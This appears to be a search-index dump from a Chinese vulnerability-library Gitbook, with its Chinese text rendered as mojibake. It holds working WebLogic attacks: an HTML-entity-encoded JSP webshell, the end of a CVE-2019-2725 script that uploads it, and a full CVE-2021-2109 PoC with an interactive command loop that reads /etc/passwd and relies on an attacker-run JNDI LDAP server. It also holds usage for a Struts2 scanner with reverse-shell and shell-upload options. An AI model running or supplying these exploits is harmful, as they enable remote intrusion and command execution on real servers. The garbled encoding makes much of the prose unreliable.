&#x3c;&#x25;&#x40;&#x20;&#x70;&#x61;&#x67;&#x65;&#x20;&#x6c;&#x61;&#x6e;&#x67;&#x75;&#x61;&#x67;&#x65;&#x3d;&#x22;&#x6a;&#x61;&#x76;&#x61;&#x22;&#x20;&#x63;&#x6f;&#x6e;&#x74;&#x65;&#x6e;&#x74;&#x54;&#x79;&#x70;&#x65;&#x3d;&#x22;&#x74;&#x65;&#x78;&#x74;&#x2f;&#x68;&#x74;&#x6d;&#x6c;&#x3b;&#x20;&#x63;&#x68;&#x61;&#x72;&#x73;&#x65;&#x74;&#x3d;&#x47;&#x42;&#x4b;&#x22;&#x0a;&#x20;&#x20;&#x20;&#x20;&#x70;&#x61;&#x67;&#x65;&#x45;&#x6e;&#x63;&#x6f;&#x64;&#x69;&#x6e;&#x67;&#x3d;&#x22;&#x55;&#x54;&#x46;&#x2d;&#x38;&#x22;&#x25;&#x3e;&#x0a;&#x3c;&#x21;&#x44;&#x4f;&#x43;&#x54;&#x59;&#x50;&#x45;&#x20;&#x68;&#x74;&#x6d;&#x6c;&#x20;&#x50;&#x55;&#x42;&#x4c;&#x49;&#x43;&#x20;&#x22;&#x2d;&#x2f;&#x2f;&#x57;&#x33;&#x43;&#x2f;&#x2f;&#x44;&#x54;&#x44;&#x20;&#x48;&#x54;&#x4d;&#x4c;&#x20;&#x34;&#x2e;&#x30;&#x31;&#x20;&#x54;&#x72;&#x61;&#x6e;&#x73;&#x69;&#x74;&#x69;&#x6f;&#x6e;&#x61;&#x6c;&#x2f;&#x2f;&#x45;&#x4e;&#x22;&#x20;&#x22;&#x68;&#x74;&#x74;&#x70;&#x3a;&#x2f;&#x2f;&#x77;&#x77;&#x77;&#x2e;&#x77;&#x33;&#x2e;&#x6f;&#x72;&#x67;&#x2f;&#x54;&#x52;&#x2f;&#x68;&#x74;&#x6d;&#x6c;&#x34;&#x2f;&#x6c;&#x6f;&#x6f;&#x73;&#x65;&#x2e;&#x64;&#x74;&#x64;&#x22;&#x3e;&#x0a;&#x3c;&#x68;&#x74;&#x6d;&#x6c;&#x3e;&#x0a;&#x20;&#x20;&#x20;&#x20;&#x3c;&#x62;&#x6f;&#x64;&#x79;&#x3e;&#x0a;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x3c;&#x25;&#x0a;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x69;&#x66;&#x20;&#x28;&#x22;&#x61;&#x64;&#x6d;&#x69;&#x6e;&#x22;&#x2e;&#x65;&#x71;&#x75;&#x61;&#x6c;&#x73;&#x28;&#x72;&#x65;&#x71;&#x75;&#x65;&#x73;&#x74;&#x2e;&#x67;&#x65;&#x74;&#x50;&#x61;&#x72;&#x61;&#x6d;&#x65;&#x74;&#x65;&#x72;&#x28;&#x22;&#x70;&#x77;&#x64;&#x22;&#x29;&#x29;&#x29;&#x20;&#x7b;&#x0a;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x6a;&#x61;&#x76;&#x61;&#x2e;&#x69;&#x6f;&#x2e;&#x49;&#x6e;&#x70;&#x75;&#x74;&#x53;&#x74;&#x72;&#x65;&#x61;&#x6d;&#x20;&#x69;&#x6e;&#x70;&#x75;&#x74;&#x20;&#x3d;&#x20;&#x52;&#x75;&#x6e;&#x74;&#x69;&#x6d;&#x65;&#x2e;&#x67;&#x65;&#x74;&#x52;&#x75;&#x6e;&#x74;&#x69;&#x6d;&#x65;&#x28;&#x29;&#x2e;&#x65;&#x78;&#x65;&#x63;&#x28;&#x72;&#x65;&#x71;&#x75;&#x65;&#x73;&#x74;&#x2e;&#x67;&#x65;&#x74;&#x50;&#x61;&#x72;&#x61;&#x6d;&#x65;&#x74;&#x65;&#x72;&#x28;&#x22;&#x63;&#x6d;&#x64;&#x22;&#x29;&#x29;&#x2e;&#x67;&#x65;&#x74;&#x49;&#x6e;&#x70;&#x75;&#x74;&#x53;&#x74;&#x72;&#x65;&#x61;&#x6d;&#x28;&#x29;&#x3b;&#x0a;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x69;&#x6e;&#x74;&#x20;&#x6c;&#x65;&#x6e;&#x20;&#x3d;&#x20;&#x2d;&#x31;&#x3b;&#x0a;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x62;&#x79;&#x74;&#x65;&#x5b;&#x5d;&#x20;&#x62;&#x79;&#x74;&#x65;&#x73;&#x20;&#x3d;&#x20;&#x6e;&#x65;&#x77;&#x20;&#x62;&#x79;&#x74;&#x65;&#x5b;&#x34;&#x30;&#x39;&#x32;&#x5d;&#x3b;&#x0a;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x6f;&#x75;&#x74;&#x2e;&#x70;&#x72;&#x69;&#x6e;&#x74;&#x28;&#x22;&#x3c;&#x70;&#x72;&#x65;&#x3e;&#x22;&#x29;&#x3b;&#x0a;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x77;&#x68;&#x69;&#x6c;&#x65;&#x20;&#x28;&#x28;&#x6c;&#x65;&#x6e;&#x20;&#x3d;&#x20;&#x69;&#x6e;&#x70;&#x75;&#x74;&#x2e;&#x72;&#x65;&#x61;&#x64;&#x28;&#x62;&#x79;&#x74;&#x65;&#x73;&#x29;&#x29;&#x20;&#x21;&#x3d;&#x20;&#x2d;&#x31;&#x29;&#x20;&#x7b;&#x0a;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x6f;&#x75;&#x74;&#x2e;&#x70;&#x72;&#x69;&#x6e;&#x74;&#x6c;&#x6e;&#x28;&#x6e;&#x65;&#x77;&#x20;&#x53;&#x74;&#x72;&#x69;&#x6e;&#x67;&#x28;&#x62;&#x79;&#x74;&#x65;&#x73;&#x2c;&#x20;&#x22;&#x47;&#x42;&#x4b;&#x22;&#x29;&#x29;&#x3b;&#x0a;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x7d;&#x0a;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x6f;&#x75;&#x74;&#x2e;&#x70;&#x72;&#x69;&#x6e;&#x74;&#x28;&#x22;&#x3c;&#x2f;&#x70;&#x72;&#x65;&#x3e;&#x22;&#x29;&#x3b;&#x0a;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x7d;&#x0a;&#x20;&#x20;&#x20;&#x20;&#x25;&#x3e;&#x0a;&#x20;&#x20;&#x20;&#x20;&#x3c;&#x2f;&#x62;&#x6f;&#x64;&#x79;&#x3e;&#x0a;&#x0a;&#x3c;&#x2f;&#x68;&#x74;&#x6d;&#x6c;&#x3e; ]]> ''' url=\"%s/wls-wsat/CoordinatorPortType\"%(ip) rsp = requests.post(url, data=body, verify=False, headers=headers) logger.info(\"\\r\\nShellÂú∞ÂùÄÔºö %s/bea_wls_internal/demo.jsp?pwd=admin&cmd=ipconfig\"%(ip)) if __name__=='__main__': info='''ÂëΩ‰ª§ÊâßË°åÔºö python weblogic-2019-2725.py 10.3.6 http//:127.0.0.1:7001 cmd python weblogic-2019-2725.py 12.1.3 http//:127.0.0.1:7001 cmd ‰∏ä‰º†webshell python weblogic-2019-2725.py 10.3.6 http//:ip:port python weblogic-2019-2725.py 12.1.3 http//:ip:port ''' print(info) if len(sys.argv)==3: if sys.argv[1] ==\"10.3.6\": webshell_10_3_6(sys.argv[2]) elif sys.argv[1] ==\"12.1.3\": webshell_12_1_3(sys.argv[2]) else: logger.error(\"ÂèÇÊï∞‰º†ÂÖ•ÈîôËØØ\") elif len(sys.argv)==4: if sys.argv[1] ==\"10.3.6\": weblogic_10_3_6(sys.argv[2],sys.argv[3]) elif sys.argv[1] ==\"12.1.3\": weblogic_12_1_3(sys.argv[2],sys.argv[3]) else: logger.error(\"ÂèÇÊï∞‰º†ÂÖ•ÈîôËØØ\") else: logger.error(\"ÂèÇÊï∞‰º†ÂÖ•ÈîôËØØ\") Á®ªËçâ‰∫∫ÂÆâÂÖ®ÊºèÊ¥ûÂ∫ì all right reservedÔºåpowered by GitbookÊñá‰ª∂Êõ¥Êñ∞Êó∂Èó¥Ôºö 2021-07-21 13:48:08 "},"book/WebÊúçÂä°Âô®ÊºèÊ¥û/Weblogic/Weblogic LDAP ËøúÁ®ã‰ª£Á†ÅÊâßË°åÊºèÊ¥û CVE-2021-2109.html":{"url":"book/WebÊúçÂä°Âô®ÊºèÊ¥û/Weblogic/Weblogic LDAP ËøúÁ®ã‰ª£Á†ÅÊâßË°åÊºèÊ¥û CVE-2021-2109.html","title":"Weblogic LDAP ËøúÁ®ã‰ª£Á†ÅÊâßË°åÊºèÊ¥û CVE-2021-2109","keywords":"","body":"Weblogic LDAP ËøúÁ®ã‰ª£Á†ÅÊâßË°åÊºèÊ¥û CVE-2021-2109 ÊºèÊ¥ûÊèèËø∞ 2021Âπ¥1Êúà20Êó•ÔºåÁªøÁõüÁßëÊäÄÁõëÊµãÂèëÁé∞OracleÂÆòÊñπÂèëÂ∏É‰∫Ü2021Âπ¥1ÊúàÂÖ≥ÈîÆË°•‰∏ÅÊõ¥Êñ∞ÂÖ¨ÂëäCPUÔºàCritical Patch UpdateÔºâÔºåÂÖ±‰øÆÂ§ç‰∫Ü329‰∏™‰∏çÂêåÁ®ãÂ∫¶ÁöÑÊºèÊ¥ûÔºåÂÖ∂‰∏≠ÂåÖÊã¨7‰∏™ÂΩ±ÂìçWebLogicÁöÑ‰∏•ÈáçÊºèÊ¥ûÔºàCVE-2021-1994„ÄÅCVE-2021-2047„ÄÅCVE-2021-2064„ÄÅCVE-2021-2108„ÄÅCVE-2021-2075„ÄÅCVE-2019-17195„ÄÅCVE-2020-14756ÔºâÔºåÊú™ÁªèË∫´‰ªΩÈ™åËØÅÁöÑÊîªÂáªËÄÖÂèØÈÄöËøáÊ≠§Ê¨°ÁöÑÊºèÊ¥ûÂÆûÁé∞ËøúÁ®ã‰ª£Á†ÅÊâßË°å„ÄÇCVSSËØÑÂàÜÂùá‰∏∫9.8ÔºåÂà©Áî®Â§çÊùÇÂ∫¶‰Ωé„ÄÇÂª∫ËÆÆÁî®Êà∑Â∞ΩÂø´ÈááÂèñÊé™ÊñΩÔºåÂØπ‰∏äËø∞ÊºèÊ¥ûËøõË°åÈò≤Êä§„ÄÇ ÊºèÊ¥ûÂΩ±Âìç [!NOTE] WebLogic Server 10.3.6.0.0 WebLogic Server 12.1.3.0.0 WebLogic Server 12.2.1.3.0 WebLogic Server 12.2.1.4.0 WebLogic Server 14.1.1.0.0 ÁéØÂ¢ÉÊê≠Âª∫ git clone https://github.com/vulhub/vulhub.git cd vulhub/weblogic/CVE-2020-14882 docker-compose up -d ËÆøÈóÆ http://xxx.xxx.xxx.xxx:7001 Ê≠£Â∏∏Âç≥ÂèØ ÊºèÊ¥ûÂ§çÁé∞ ËÆøÈóÆ‰∏Ä‰∏ãURL http://xxx.xxx.xxx.xxx:7001/console/css/%252e%252e%252f/consolejndi.portal Â¶ÇÊûúÊúâÊ≠§È°µÈù¢Êú™ÊéàÊùÉÂèØËÆøÈóÆÔºå‰∏îÂú®ÂΩ±ÂìçËåÉÂõ¥ÂÜÖÂàôÂèØËÉΩÂá∫Áé∞ÊºèÊ¥û ‰∏ãËΩΩÊºèÊ¥ûÊîªÂáªÈúÄË¶ÅÁöÑ LDAPÂêØÂä®ËÑöÊú¨ ‰∏ãËΩΩÈìæÊé• ‰∏ãËΩΩÂà∞ÊúçÂä°Âô®‰∏äÂêØÂä® java -jar JNDIExploit-v1.11.jar -i xxx.xxx.xxx.xxx (ÊúçÂä°Âô®Âú∞ÂùÄ) [!NOTE] ÈÉ®ÂàÜÊúçÂä°Âô®Ê≥®ÊÑèÊîæË°åÁ´ØÂè£ ÁÑ∂ÂêéÈÖçÂêà WeblogicÊú™ÊéàÊùÉËåÉÂõ¥ ÂëΩ‰ª§ÊâßË°å /console/css/%252e%252e/consolejndi.portal?_pageLabel=JNDIBindingPageGeneral&_nfpb=true&JNDIBindingPortlethandle=com.bea.console.handles.JndiBindingHandle(%22ldap://xxx.xxx.xxx;xxx:1389/Basic/WeblogicEcho;AdminServer%22) [!NOTE] Ê≥®ÊÑè ldap://xxx.xxx.xxx;xxx:1389/Basic/WeblogicEcho ËøôÈáå LDAPÊúçÂä°Âô®Âú∞ÂùÄÁ¨¨‰∏â‰∏™ÂàÜÈöîÁ¨¶Âè∑‰∏∫ ; ÁôªÂΩïÂêéÂè∞ÂèØ‰ΩøÁî®Ê≠§POCÔºåÊú™ÊéàÊùÉÁöÑËØùÁî®‰∏äÈù¢ÁöÑ /console/consolejndi.portal?_pageLabel=JNDIBindingPageGeneral&_nfpb=true&JNDIBindingPortlethandle=com.bea.console.handles.JndiBindingHandle(%22ldap://xxx.xxx.xxx;xxx:1389/Basic/WeblogicEcho;AdminServer%22) ÊºèÊ¥ûÂà©Áî®POC [!NOTE] Ê≥®ÊÑèÂèÇÊï∞Ê†ºÂºè Ldap >>> ldap://xxx.xxx.xxx;xxx:1389 ‰∏≠ÁöÑÂàÜÂè∑ Â¶ÇÊûú‰ΩøÁî®ÂÖ∂‰ªñÁöÑÂà©Áî®LdapÊúçÂä°ËØ∑Ëá™Ë°åÊõ¥Êîπ POCÂÖ≥ÈîÆÂ≠ó Ê≠§POC‰ªÖ‰ªÖÊ£ÄÈ™åÊúâÊú™ÊéàÊùÉÁöÑÊÉÖÂÜµ import requests import sys import re requests.packages.urllib3.disable_warnings() from requests.packages.urllib3.exceptions import InsecureRequestWarning def title(): print('+------------------------------------------') print('+ \\033[34mPOC_Des: http://wiki.peiqi.tech \\033[0m') print('+ \\033[34mGithub : https://github.com/PeiQi0 \\033[0m') print('+ \\033[34mÂÖ¨‰ºóÂè∑ : PeiQiÊñáÂ∫ì \\033[0m') print('+ \\033[34mVersion: Weblogic Â§ö‰∏™ÁâàÊú¨ \\033[0m') print('+ \\033[36m‰ΩøÁî®Ê†ºÂºè: python3 poc.py \\033[0m') print('+ \\033[36mUrl >>> http://xxx.xxx.xxx.xxx \\033[0m') print('+ \\033[36mLDAP >>> ldap://xxx.xxx.xxx;xxx:1389 \\033[0m') print('+------------------------------------------') def POC_1(target_url, ldap_url, cmd): vuln_url = target_url + \"/console/css/%252e%252e/consolejndi.portal?_pageLabel=JNDIBindingPageGeneral&_nfpb=true&JNDIBindingPortlethandle=com.bea.console.handles.JndiBindingHandle(%22{}/Basic/WeblogicEcho;AdminServer%22)\".format(ldap_url) print('\\033[36m[o] Ê≠£Âú®ËØ∑Ê±Ç: {}'.format(vuln_url)) headers = { \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\", \"cmd\": cmd } try: response = requests.get(url=vuln_url, headers=headers, verify=False, timeout=5) if \"root:\" in response.text: print(\"\\033[32m[o] ÁõÆÊ†á{}Â≠òÂú®ÊºèÊ¥û \\033[0m\".format(target_url)) print(\"\\033[32m[o] ÂìçÂ∫î‰∏∫:\\n{} \\033[0m\".format(response.text)) else: print(\"\\033[31m[x] ÂëΩ‰ª§ÊâßË°åÂ§±Ë¥• \\033[0m\") sys.exit(0) except Exception as e: print(\"\\033[31m[x] ËØ∑Ê£ÄÊü•ÂèÇÊï∞ÂíåLdapÊúçÂä°ÊòØÂê¶Ê≠£Á°Æ \\033[0m\", e) def POC_2(target_url, ldap_url, cmd): vuln_url = target_url + \"/console/css/%252e%252e/consolejndi.portal?_pageLabel=JNDIBindingPageGeneral&_nfpb=true&JNDIBindingPortlethandle=com.bea.console.handles.JndiBindingHandle(%22{}/Basic/WeblogicEcho;AdminServer%22)\".format(ldap_url) print('\\033[36m[o] Ê≠£Âú®ËØ∑Ê±Ç: {}'.format(vuln_url)) headers = { \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\", \"cmd\": cmd } try: response = requests.get(url=vuln_url, headers=headers, verify=False, timeout=5) print(\"\\033[32m[o] ÂìçÂ∫î‰∏∫:\\n{} \\033[0m\".format(response)) except Exception as e: print(\"\\033[31m[x] ËØ∑Ê£ÄÊü•ÂèÇÊï∞ÂíåLdapÊúçÂä°ÊòØÂê¶Ê≠£Á°Æ \\033[0m\", e) if __name__ == '__main__': title() target_url = str(input(\"\\033[35mPlease input Attack Url\\nUrl >>> \\033[0m\")) ldap_url = str(input(\"\\033[35mLdap >>> \\033[0m\")) POC_1(target_url, ldap_url, cmd=\"cat /etc/passwd\") while True: cmd = input(\"\\033[35mCmd >>> \\033[0m\") if cmd == \"exit\": sys.exit(0) else: POC_2(target_url, ldap_url, cmd) Goby & POC [!NOTE] Weblogic LDAP ËøúÁ®ã‰ª£Á†ÅÊâßË°åÊºèÊ¥û CVE-2021-2109 Ê≥®ÊÑèÊºèÊ¥ûÈ™åËØÅ LdapÂèÇÊï∞ÂêåÊ†∑Ë∑ü‰∏äÈù¢ÁöÑPOC‰∏ÄÊ†∑Ê†ºÂºèÔºåÊ≥®ÊÑèÂàÜÂè∑ Á®ªËçâ‰∫∫ÂÆâÂÖ®ÊºèÊ¥ûÂ∫ì all right reservedÔºåpowered by GitbookÊñá‰ª∂Êõ¥Êñ∞Êó∂Èó¥Ôºö 2021-07-21 13:48:08 "},"book/WebÊúçÂä°Âô®ÊºèÊ¥û/Nginx/":{"url":"book/WebÊúçÂä°Âô®ÊºèÊ¥û/Nginx/","title":"Nginx","keywords":"","body":"Nginx NginxË∂äÁïåËØªÂèñÁºìÂ≠òÊºèÊ¥û CVE-2017-7529 Á®ªËçâ‰∫∫ÂÆâÂÖ®ÊºèÊ¥ûÂ∫ì all right reservedÔºåpowered by GitbookÊñá‰ª∂Êõ¥Êñ∞Êó∂Èó¥Ôºö 2021-07-21 13:48:08 "},"book/WebÊúçÂä°Âô®ÊºèÊ¥û/Nginx/NginxË∂äÁïåËØªÂèñÁºìÂ≠òÊºèÊ¥û CVE-2017-7529.html":{"url":"book/WebÊúçÂä°Âô®ÊºèÊ¥û/Nginx/NginxË∂äÁïåËØªÂèñÁºìÂ≠òÊºèÊ¥û CVE-2017-7529.html","title":"NginxË∂äÁïåËØªÂèñÁºìÂ≠òÊºèÊ¥û CVE-2017-7529","keywords":"","body":"NginxË∂äÁïåËØªÂèñÁºìÂ≠òÊºèÊ¥û CVE-2017-7529 ÊºèÊ¥ûÊèèËø∞ NginxÂú®ÂèçÂêë‰ª£ÁêÜÁ´ôÁÇπÁöÑÊó∂ÂÄôÔºåÈÄöÂ∏∏‰ºöÂ∞Ü‰∏Ä‰∫õÊñá‰ª∂ËøõË°åÁºìÂ≠òÔºåÁâπÂà´ÊòØÈùôÊÄÅÊñá‰ª∂„ÄÇÁºìÂ≠òÁöÑÈÉ®ÂàÜÂ≠òÂÇ®Âú®Êñá‰ª∂‰∏≠ÔºåÊØè‰∏™ÁºìÂ≠òÊñá‰ª∂ÂåÖÊã¨‚ÄúÊñá‰ª∂Â§¥‚Äù+‚ÄúHTTPËøîÂõûÂåÖÂ§¥‚Äù+‚ÄúHTTPËøîÂõûÂåÖ‰Ωì‚Äù„ÄÇÂ¶ÇÊûú‰∫åÊ¨°ËØ∑Ê±ÇÂëΩ‰∏≠‰∫ÜËØ•ÁºìÂ≠òÊñá‰ª∂ÔºåÂàôNginx‰ºöÁõ¥Êé•Â∞ÜËØ•Êñá‰ª∂‰∏≠ÁöÑ‚ÄúHTTPËøîÂõûÂåÖ‰Ωì‚ÄùËøîÂõûÁªôÁî®Êà∑„ÄÇ Â¶ÇÊûúÊàëÁöÑËØ∑Ê±Ç‰∏≠ÂåÖÂê´RangeÂ§¥ÔºåNginxÂ∞Ü‰ºöÊ†πÊçÆÊàëÊåáÂÆöÁöÑstartÂíåend‰ΩçÁΩÆÔºåËøîÂõûÊåáÂÆöÈïøÂ∫¶ÁöÑÂÜÖÂÆπ„ÄÇËÄåÂ¶ÇÊûúÊàëÊûÑÈÄ†‰∫Ü‰∏§‰∏™Ë¥üÁöÑ‰ΩçÁΩÆÔºåÂ¶Ç(-600, -9223372036854774591)ÔºåÂ∞ÜÂèØËÉΩËØªÂèñÂà∞Ë¥ü‰ΩçÁΩÆÁöÑÊï∞ÊçÆ„ÄÇÂ¶ÇÊûúËøôÊ¨°ËØ∑Ê±ÇÂèàÂëΩ‰∏≠‰∫ÜÁºìÂ≠òÊñá‰ª∂ÔºåÂàôÂèØËÉΩÂ∞±ÂèØ‰ª•ËØªÂèñÂà∞ÁºìÂ≠òÊñá‰ª∂‰∏≠‰Ωç‰∫é‚ÄúHTTPËøîÂõûÂåÖ‰Ωì‚ÄùÂâçÁöÑ‚ÄúÊñá‰ª∂Â§¥‚Äù„ÄÅ‚ÄúHTTPËøîÂõûÂåÖÂ§¥‚ÄùÁ≠âÂÜÖÂÆπ„ÄÇ ÂΩ±ÂìçÁâàÊú¨ [!NOTE] Nginx version 0.5.6 - 1.13.2 ÁéØÂ¢ÉÊê≠Âª∫ git clone https://github.com/vulhub/vulhub.git cd vulhub/nginx/CVE-2017-7529 docker-compose up -d ËÆøÈóÆ http://xxx.xxx.xxx.xxx:8080 Ê≠£Â∏∏Âç≥ÂèØ ÊºèÊ¥ûÂ§çÁé∞ ‰ΩøÁî®ÁõÆÂΩï‰∏ãÁöÑPOCËøõË°åÈ™åËØÅ python poc.py http://xxx.xxx.xxx.xxx:8080/ ÊºèÊ¥ûÂà©Áî®POC #!/usr/bin/env python import sys import requests if len(sys.argv) Á®ªËçâ‰∫∫ÂÆâÂÖ®ÊºèÊ¥ûÂ∫ì all right reservedÔºåpowered by GitbookÊñá‰ª∂Êõ¥Êñ∞Êó∂Èó¥Ôºö 2021-07-21 13:48:08 "},"book/WebÊúçÂä°Âô®ÊºèÊ¥û/Apache/":{"url":"book/WebÊúçÂä°Âô®ÊºèÊ¥û/Apache/","title":"Apache","keywords":"","body":"Apache Apache Cocoon Apache Flink Apache HTTPd Apache Kylin Apache Mod_jk Apache Shiro Apache Solr Apache Struts2 Apache Tomcat Apache ActiveMQ Apache Druid Apache ZooKeeper Á®ªËçâ‰∫∫ÂÆâÂÖ®ÊºèÊ¥ûÂ∫ì all right reservedÔºåpowered by GitbookÊñá‰ª∂Êõ¥Êñ∞Êó∂Èó¥Ôºö 2021-07-21 13:48:08 "},"book/WebÊúçÂä°Âô®ÊºèÊ¥û/Apache/Apache Struts2/":{"url":"book/WebÊúçÂä°Âô®ÊºèÊ¥û/Apache/Apache Struts2/","title":"Apache Struts2","keywords":"","body":"Apache Struts2 Á®ªËçâ‰∫∫ÂÆâÂÖ®ÊºèÊ¥ûÂ∫ì all right reservedÔºåpowered by GitbookÊñá‰ª∂Êõ¥Êñ∞Êó∂Èó¥Ôºö 2021-07-21 13:48:08 "},"book/WebÊúçÂä°Âô®ÊºèÊ¥û/Apache/Apache Struts2/Scan/":{"url":"book/WebÊúçÂä°Âô®ÊºèÊ¥û/Apache/Apache Struts2/Scan/","title":"Êâ´ÊèèÂ∑•ÂÖ∑","keywords":"","body":"Êâ´ÊèèÂ∑•ÂÖ∑ Exphub Apache Struts2 Struts2-Scan Á®ªËçâ‰∫∫ÂÆâÂÖ®ÊºèÊ¥ûÂ∫ì all right reservedÔºåpowered by GitbookÊñá‰ª∂Êõ¥Êñ∞Êó∂Èó¥Ôºö 2021-07-21 13:48:08 "},"book/WebÊúçÂä°Âô®ÊºèÊ¥û/Apache/Apache Struts2/Scan/Êâ´ÊèèÂ∑•ÂÖ∑ Struts2-Scan.html":{"url":"book/WebÊúçÂä°Âô®ÊºèÊ¥û/Apache/Apache Struts2/Scan/Êâ´ÊèèÂ∑•ÂÖ∑ Struts2-Scan.html","title":"Êâ´ÊèèÂ∑•ÂÖ∑ Struts2-Scan","keywords":"","body":"Struts2-Scan ÊºèÊ¥ûÈ™åËØÅ Â∑•ÂÖ∑Âú∞ÂùÄ Struts2-Scan Â∑•ÂÖ∑ÊèèËø∞ Struts2ÊºèÊ¥ûÂà©Áî®Êâ´ÊèèÂ∑•ÂÖ∑ÔºåÂü∫‰∫é‰∫íËÅîÁΩë‰∏äÂ∑≤ÁªèÂÖ¨ÂºÄÁöÑStructs2È´òÂç±ÊºèÊ¥ûexpÁöÑÊâ´ÊèèÂà©Áî®Â∑•ÂÖ∑ÔºåÁõÆÂâçÊîØÊåÅÁöÑÊºèÊ¥ûÂ¶Ç‰∏ã: S2-001, S2-003, S2-005, S2-007, S2-008, S2-009, S2-012, S2-013, S2-015, S2-016, S2-019, S2-029, S2-032, S2-033, S2-037, S2-045, S2-046, S2-048, S2-052, S2-053, S2-devMode, S2-057 ÊîØÊåÅÂçï‰∏™URLÊºèÊ¥ûÊ£ÄÊµãÂíåÊâπÈáèURLÊ£ÄÊµãÔºåËá≥Ê≠§ÊåáÂÆöÊºèÊ¥ûÂà©Áî®ÔºåÂèØËé∑ÂèñWEBË∑ØÂæÑÔºåÊâßË°åÂëΩ‰ª§ÔºåÂèçÂºπshellÂíå‰∏ä‰º†Êñá‰ª∂ÔºåÊ≥®ÊÑèÔºåÂπ∂‰∏çÊòØÊâÄÊúâÁöÑÊºèÊ¥ûÂùáÊîØÊåÅ‰∏äËø∞ÂäüËÉΩÔºåÂè™ÊúâÈÉ®ÂàÜÂäüËÉΩÊîØÊåÅ ËøêË°åÁéØÂ¢É Python3.6.XÂèäÂÖ∂‰ª•‰∏äÁâàÊú¨ Á¨¨‰∏âÊñπÂ∫ì: click, requests, bs4 ÊµãËØïÁéØÂ¢É: Ubuntu 16.04 ÊºèÊ¥ûÁéØÂ¢ÉÂ∑≤‰∏ä‰º†ÔºåÂèÇËÄÉÂú∞ÂùÄÔºö https://github.com/Medicean/VulApps/tree/master/s/struts2/ https://github.com/vulhub/vulhub/tree/master/struts2 Â∑•ÂÖ∑ÂèÇÊï∞ Usage: Struts2Scan.py [OPTIONS] Struts2ÊâπÈáèÊâ´ÊèèÂà©Áî®Â∑•ÂÖ∑ Options: -i, --info ÊºèÊ¥û‰ø°ÊÅØ‰ªãÁªç -v, --version ÊòæÁ§∫Â∑•ÂÖ∑ÁâàÊú¨ -u, --url TEXT URLÂú∞ÂùÄ -n, --name TEXT ÊåáÂÆöÊºèÊ¥ûÂêçÁß∞, ÊºèÊ¥ûÂêçÁß∞ËØ¶ËßÅinfo -f, --file TEXT ÊâπÈáèÊâ´ÊèèURLÊñá‰ª∂, ‰∏ÄË°å‰∏Ä‰∏™URL -d, --data TEXT POSTÂèÇÊï∞, ÈúÄË¶Å‰ΩøÁî®ÁöÑpayload‰ΩøÁî®{exp}Â°´ÂÖÖ, Â¶Ç: name=test&passwd={exp} -c, --encode TEXT È°µÈù¢ÁºñÁ†Å, ÈªòËÆ§UTF-8ÁºñÁ†Å -p, --proxy TEXT HTTP‰ª£ÁêÜ. Ê†ºÂºè‰∏∫http://ip:port -t, --timeout TEXT HTTPË∂ÖÊó∂Êó∂Èó¥, ÈªòËÆ§10s -w, --workers TEXT ÊâπÈáèÊâ´ÊèèËøõÁ®ãÊï∞, ÈªòËÆ§‰∏∫10‰∏™ËøõÁ®ã --header TEXT HTTPËØ∑Ê±ÇÂ§¥, Ê†ºÂºè‰∏∫: key1=value1&key2=value2 -e, --exec ËøõÂÖ•ÂëΩ‰ª§ÊâßË°åshell --webpath Ëé∑ÂèñWEBË∑ØÂæÑ -r, --reverse TEXT ÂèçÂºπshellÂú∞ÂùÄ, Ê†ºÂºè‰∏∫ip:port --upfile TEXT ÈúÄË¶Å‰∏ä‰º†ÁöÑÊñá‰ª∂Ë∑ØÂæÑÂíåÂêçÁß∞ --uppath TEXT ‰∏ä‰º†ÁöÑÁõÆÂΩïÂíåÂêçÁß∞, Â¶Ç: /usr/local/tomcat/webapps/ROOT/shell.jsp -q, --quiet ÂÖ≥Èó≠ÊâìÂç∞‰∏çÂ≠òÂú®ÊºèÊ¥ûÁöÑËæìÂá∫ÔºåÂè™‰øùÁïôÂ≠òÂú®ÊºèÊ¥ûÁöÑËæìÂá∫ -h, --help Show this message and exit. ‰ΩøÁî®‰æãÂ≠ê Êü•ÁúãÊºèÊ¥ûËØ¶ÁªÜ‰ø°ÊÅØ: $ python3 Struts2Scan.py --info ____ _ _ ____ ____ / ___|| |_ _ __ _ _| |_ ___|___ \\ / ___| ___ __ _ _ __ \\___ \\| __| '__| | | | __/ __| __) | \\___ \\ / __/ _` | '_ \\ ___) | |_| | | |_| | |_\\__ \\/ __/ ___) | (_| (_| | | | | |____/ \\__|_| \\__,_|\\__|___/_____| |____/ \\___\\__,_|_| |_| Author By HatBoy [+] ÊîØÊåÅÂ¶Ç‰∏ãStruts2ÊºèÊ¥û: [+] S2-001:ÂΩ±ÂìçÁâàÊú¨Struts 2.0.0-2.0.8; POSTËØ∑Ê±ÇÂèëÈÄÅÊï∞ÊçÆ; ÈªòËÆ§ÂèÇÊï∞‰∏∫:username,password; ÊîØÊåÅËé∑ÂèñWEBË∑ØÂæÑ,‰ªªÊÑèÂëΩ‰ª§ÊâßË°åÂíåÂèçÂºπshell [+] S2-003:ÂΩ±ÂìçÁâàÊú¨Struts 2.0.0-2.0.11.2; 